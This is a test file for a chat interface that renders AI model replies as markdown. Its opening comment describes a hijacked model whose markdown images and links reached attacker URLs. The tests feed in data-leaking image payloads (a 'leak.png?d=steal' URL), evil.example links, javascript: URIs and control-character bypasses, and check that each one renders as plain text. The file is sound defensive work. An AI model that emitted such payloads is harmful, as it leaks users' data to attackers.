/**
 * Phase 6 security LLM-2 / LLM-3: a hijacked model's markdown became a real
 * <img> (zero-click request to an attacker URL, stopped only by CSP) and a
 * clickable link to any http(s) host.
 */
import { describe, expect, it, vi } from 'vitest';
import { render } from '@testing-library/react';
import ReactMarkdown from 'react-markdown';
import { createElement, type ReactNode } from 'react';

vi.mock('next/link', () => ({
  default: ({ href, children, ...rest }: { href: string; children: ReactNode }) => createElement('a', { href, 'data-internal': 'true', ...rest }, children),
}));

const { chatMarkdownComponents } = await import('@/components/ubunye/chatMarkdown');
const { chatLinkTarget } = await import('@/lib/ubunye/chat-links');

const renderReply = (md: string) =>
  render(createElement(ReactMarkdown, { components: chatMarkdownComponents }, md)).container;

describe('Ubunye reply rendering (LLM-2/LLM-3)', () => {
  it('the attacker payload: no <img>, and the off-site link is plain text', () => {
    const c = renderReply('Here ![x](http://127.0.0.1:9/leak.png?d=steal) and [click](http://127.0.0.1:9/evil)');
    expect(c.querySelector('img')).toBeNull();
    expect(c.innerHTML).not.toContain('127.0.0.1');
    expect(c.querySelector('a')).toBeNull();
    expect(c.textContent).toContain('click');
  });

  it('never loads any image, not even from https hosts', () => {
    const c = renderReply('![logo](https://res.cloudinary.com/x/image/upload/a.png)');
    expect(c.querySelector('img')).toBeNull();
    expect(c.textContent).toContain('[image: logo]');
  });

  it('keeps same-site and allowlisted links clickable', () => {
    const c = renderReply('[gear](/smart-rentals) [book](https://www.thabangvision.com/studio) [chat](https://wa.me/27639905802)');
    const links = [...c.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(links).toEqual(['/smart-rentals', 'https://www.thabangvision.com/studio', 'https://wa.me/27639905802']);
  });

  it.each([
    'https://evil.example/login',
    'http://www.thabangvision.com/pay',
    '//evil.example/x',
    '/\\evil.example',
    'https://user:pw@www.thabangvision.com/',
    'mailto:attacker@evil.example',
    'mailto:hello@thabangvision.com?body=secret',
    'javascript:alert(1)',
    'data:text/html,hi',
  ])('%s is not a link', (href) => {
    expect(chatLinkTarget(href).kind).toBe('text');
  });

  it('our own contact links work', () => {
    expect(chatLinkTarget('mailto:bookings@thabangvision.com').kind).toBe('external');
    expect(chatLinkTarget('tel:+27639905802').kind).toBe('external');
    expect(chatLinkTarget('https://instagram.com/thabangvision').kind).toBe('external');
  });
});

describe('review fixes: control-character paths and model-chosen payment/WhatsApp links', () => {
  it.each(['/\t/evil.com', '/\n/evil.com', '/ /evil.com', '/\\evil.com', '/\u0000/evil.com', ' //evil.com'])(
    '%j is not an internal link',
    (href) => {
      expect(chatLinkTarget(href).kind).toBe('text');
    },
  );

  it('the markdown forms of the bypass never produce an off-site link', () => {
    const c = renderReply('[x](/&#9;/evil.com) and [a](</\t/evil.com>) and [b](//evil.com)');
    for (const a of c.querySelectorAll('a')) {
      // How a browser resolves it (it strips raw tabs/newlines first).
      const href = (a.getAttribute('href') ?? '').replace(/[\t\n\r]/g, '');
      expect(new URL(href, 'https://site.invalid').origin).toBe('https://site.invalid');
    }
  });

  it('a checkout.paystack.com link chosen by the model is plain text', () => {
    expect(chatLinkTarget('https://checkout.paystack.com/attacker-page').kind).toBe('text');
  });

  it("only the studio's own WhatsApp number is a link", async () => {
    const { STUDIO } = await import('@/lib/constants');
    expect(chatLinkTarget(`https://wa.me/${STUDIO.whatsapp.number}`).kind).toBe('external');
    expect(chatLinkTarget(`https://wa.me/${STUDIO.whatsapp.number}?text=hi`).kind).toBe('external');
    expect(chatLinkTarget('https://wa.me/27820000000').kind).toBe('text');
    expect(chatLinkTarget('https://api.whatsapp.com/send?phone=27820000000').kind).toBe('text');
  });

  it('ordinary internal links still work', () => {
    expect(chatLinkTarget('/rentals?cat=lenses#top')).toEqual({ kind: 'internal', href: '/rentals?cat=lenses#top' });
  });
});

describe('Codex review: classification never throws; tel: only to the studio', () => {
  const MALFORMED = [
    'mailto:%', 'mailto:%E0%A4%A', 'mailto:%ZZ@x', 'tel:%', 'https://%', 'https://wa.me/%', '/%', '/%E0%A4%A',
    'mailto:', 'tel:', 'http://[::1', 'https://[', '//', '/', '#', '?', 'javascript:%', 'data:,%', '\u0000', '%',
    'https://user:%@x', 'mailto:hello@thabangvision.com?subject=%',
  ];

  it.each(MALFORMED)('%j is classified without throwing', (href) => {
    expect(() => chatLinkTarget(href)).not.toThrow();
  });

  it('a markdown mailto with a broken escape renders as text instead of crashing the chat', () => {
    expect(() => renderReply('[contact](mailto:%)')).not.toThrow();
    expect(renderReply('[contact](mailto:%)').querySelector('a')).toBeNull();
  });

  it('random strings never throw', () => {
    const chars = ['%', ':', '/', '\\\\', '@', '?', '#', '[', ']', 'a', '0', ' ', 'mailto:', 'tel:', 'https://', 'wa.me', ' '];
    let seed = 7;
    const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    for (let i = 0; i < 2000; i++) {
      let s = '';
      for (let j = 0; j < 1 + Math.floor(rnd() * 8); j++) s += chars[Math.floor(rnd() * chars.length)];
      expect(() => chatLinkTarget(s), s).not.toThrow();
    }
  });

  it("tel: is a link only for the studio's own number, however it is written", async () => {
    const { STUDIO } = await import('@/lib/constants');
    const digits = STUDIO.phone.replace(/\D/g, ''); // 27…
    const local = `0${digits.slice(2)}`;
    for (const ok of [`tel:${STUDIO.phone.replace(/\s/g, '')}`, `tel:+${digits}`, `tel:${local}`, `tel:${local.slice(0, 3)}-${local.slice(3, 6)}-${local.slice(6)}`, `tel:00${digits}`]) {
      expect(chatLinkTarget(ok).kind, ok).toBe('external');
    }
    for (const bad of ['tel:+27820000000', 'tel:0820000000', 'tel:*123#', 'tel:', `tel:${digits}1`]) {
      expect(chatLinkTarget(bad).kind, bad).toBe('text');
    }
  });
});
